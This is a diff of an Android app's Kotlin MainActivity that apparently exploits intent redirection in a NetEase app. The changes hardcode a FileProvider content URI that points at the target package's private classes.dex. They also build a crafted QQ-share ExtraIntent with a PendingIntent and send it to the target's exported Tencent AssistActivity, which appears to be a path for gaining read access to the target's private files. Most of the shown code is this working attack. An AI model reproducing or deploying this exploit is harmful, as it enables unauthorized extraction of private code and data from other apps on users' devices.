@@ -152,77 +152,8 @@ class MainActivity : AppCompatActivity() {
                 revokeAllPermissions()
                 true
             }
-            R.id.action_custom_uri -> {
-                showCustomUriDialog()
-                true
-            }
             else -> super.onOptionsItemSelected(item)
         }
-    }
-
-    // ==================== 自定义 Content URI 头 ====================
-
-    companion object {
-        private const val PREFS_NAME = "wnlz_prefs"
-        private const val KEY_URI_PREFIX = "uri_prefix"
-        private const val DEFAULT_URI_PREFIX = "content://com.netease.x19.fileprovider/files/"
-    }
-
-    /**
-     * 获取自定义的 Content URI 前缀
-     */
-    private fun getUriPrefix(): String {
-        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
-        return prefs.getString(KEY_URI_PREFIX, DEFAULT_URI_PREFIX) ?: DEFAULT_URI_PREFIX
-    }
-
-    /**
-     * 显示自定义 Content URI 头对话框
-     */
-    private fun showCustomUriDialog() {
-        val currentPrefix = getUriPrefix()
-        val editText = com.google.android.material.textfield.TextInputEditText(this).apply {
-            setText(currentPrefix)
-            hint = getString(R.string.dialog_custom_uri_hint)
-            setSingleLine()
-        }
-        val inputLayout = com.google.android.material.textfield.TextInputLayout(
-            this,
-            null,
-            com.google.android.material.R.style.Widget_Material3_TextInputLayout_OutlinedBox
-        ).apply {
-            addView(editText)
-            boxBackgroundMode = com.google.android.material.textfield.TextInputLayout.BOX_BACKGROUND_OUTLINE
-            hint = getString(R.string.dialog_custom_uri_hint)
-            setPadding(48, 24, 48, 24)
-        }
-
-        com.google.android.material.dialog.MaterialAlertDialogBuilder(this)
-            .setTitle(R.string.dialog_custom_uri_title)
-            .setView(inputLayout)
-            .setPositiveButton(R.string.action_confirm) { _, _ ->
-                val newPrefix = editText.text?.toString()?.trim().orEmpty()
-                if (newPrefix.isEmpty()) {
-                    Toast.makeText(this, "URI头不能为空", Toast.LENGTH_SHORT).show()
-                    return@setPositiveButton
-                }
-                // 确保以 / 结尾
-                val normalizedPrefix = if (newPrefix.endsWith("/")) newPrefix else "$newPrefix/"
-                getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
-                    .edit()
-                    .putString(KEY_URI_PREFIX, normalizedPrefix)
-                    .apply()
-                Toast.makeText(this, "已保存: $normalizedPrefix", Toast.LENGTH_SHORT).show()
-            }
-            .setNegativeButton(R.string.action_cancel, null)
-            .setNeutralButton("恢复默认") { _, _ ->
-                getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
-                    .edit()
-                    .putString(KEY_URI_PREFIX, DEFAULT_URI_PREFIX)
-                    .apply()
-                Toast.makeText(this, "已恢复默认: $DEFAULT_URI_PREFIX", Toast.LENGTH_SHORT).show()
-            }
-            .show()
     }
 
     // ==================== 释放所有权限 ====================
@@ -594,9 +525,8 @@ class MainActivity : AppCompatActivity() {
                     packageInfo.versionCode.toString()
                 }
 
-                // 构造 dex 文件的 content URI（使用自定义 URI 头）
-                val uriPrefix = getUriPrefix()
-                val dexUriStr = uriPrefix + "data/data/$targetPackage/app_ntp0/${versionName}_${versionCode}/.unzip/classes.dex"
+                // 构造 dex 文件的 content URI
+                val dexUriStr = "content://com.netease.x19.osdkcommon.fileprovider/name/data/data/$targetPackage/app_ntp0/${versionName}_${versionCode}/.unzip/classes.dex"
                 val dexUri = Uri.parse(dexUriStr)
 
                 // 尝试读取 URI 判断是否有权限
@@ -671,7 +601,15 @@ class MainActivity : AppCompatActivity() {
                     // intent1: 指向目标包的 AssistActivity
                     val intent1 = Intent()
                         .setComponent(ComponentName(targetPackage, "com.tencent.connect.common.AssistActivity"))
-                    intent1.putExtra("openSDK_LOG.AssistActivity.ExtraIntent", Intent())
+
+                    // 构造 ExtraIntent（QQ 分享 Intent）
+                    val extraIntent = Intent()
+                    extraIntent.putExtra("key_request_code", 0x2782)
+                    extraIntent.putExtra("appid", "1106798370")
+                    extraIntent.putExtra("for_result", true)
+                    extraIntent.setData(Uri.parse("https://openmobile.qq.com/share?share_id=poc_001"))
+
+                    intent1.putExtra("openSDK_LOG.AssistActivity.ExtraIntent", extraIntent)
                     intent1.putExtra("key_extra_pending_intent", pendingIntent)
 
                     runOnUiThread {
